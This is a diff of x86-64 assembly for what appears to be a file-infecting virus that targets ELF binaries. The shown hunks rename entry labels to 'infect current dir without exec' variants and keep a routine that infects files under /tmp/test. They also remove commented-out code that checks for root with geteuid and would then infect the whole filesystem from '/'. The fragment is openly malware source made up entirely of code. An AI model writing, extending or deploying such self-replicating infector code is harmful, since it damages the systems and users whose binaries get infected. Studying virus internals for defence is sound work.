@@ -33,7 +33,7 @@ _encrypted_part_start:
 	;; (To know why some times we need to execute the infection only, refer to the commentaries in fork.s
 	;; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv))
 	cmp		QWORD [rsp + 136], 3				; if argc == 3
-	je		_alternative_start
+	je		_stack_infect_current_dir_without_exec
 
 	;; ** If argc equals 4 **
 	cmp		QWORD [rsp + 136], 4				; if argc == 4
@@ -42,7 +42,7 @@ _encrypted_part_start:
 ;; Check if program arguments are passed via registers
 _check_registers:
 	cmp		QWORD [rsp + 64], 3 				; if argc == 3
-	je		_alternative_start_by_registers		; 
+	je		_reg_infect_current_dir_without_exec	; 
 	
     jmp     _fork_before_exec_normaly
 
@@ -53,22 +53,9 @@ _continue_normaly:
 	push	rax
 	push	rax
 
-; Here we check if their is a o_entry address. If so, we are in an infected binary,
-; so we just infect /tmp/test(2), and execute the code normally.
-; Else, we test for the privilege we have, and try to infect from / if we can
-;	cmp QWORD [r10], 0 ; compare _o_entry with 0
-;	jne _infect_tmp_test
-;	mov rax, 107
-;	syscall ; We call geteuid
-;	cmp rax, 0 ; if geteuid return 0, so we are root, and we have largelly right to infect from /
-;	jne _infect_tmp_test
-;	mov rax, 0
-;	jmp _push_it
-
 _infect_tmp_test:
+; Push tmp/test on stack. _read_dir will concatene it like this: "" + "/" + "tmp/test"
 	mov		rax, 0x747365742f706d74			; %rax = "tmp/test"
-
-_push_it:
 	push	rax								; push infection path on stack
 	mov		rdi, rsp
 	mov		rsi, rsp
@@ -83,7 +70,6 @@ _push_it:
 	call	_read_dir						; call our directory browsing function
 
 ;; Pop everything we just pushed
-_jmp_end:
 	pop		rdi
 	pop		rdi
 	pop		rdi
@@ -100,7 +86,7 @@ _jmp_end:
 ; On the stack, we have 8 bytes for argc, then 8 bytes per arguments (argv)
 
 ;; Start via stack
-_alternative_start:
+_stack_infect_current_dir_without_exec:
 	mov		r10, QWORD [rsp + 152]		; argv[1]
 	lea		r11, [rel _verif]			; relative address of _verif
 	mov		r11, QWORD [r11]			; dereferencing
@@ -124,7 +110,7 @@ _alternative_start:
 ; don't corrupt the normal execution, so we will find our arguments on the stack.
 
 ;; Start via registers
-_alternative_start_by_registers:
+_reg_infect_current_dir_without_exec:
 	mov		r10, QWORD [rsp + 72]		; here we take argv
 	mov		r10, QWORD [r10 + 8]		; argv is an array, so we take the index 1 (argv[1]).
 	lea		r11, [rel _verif]			; relative address of _verif
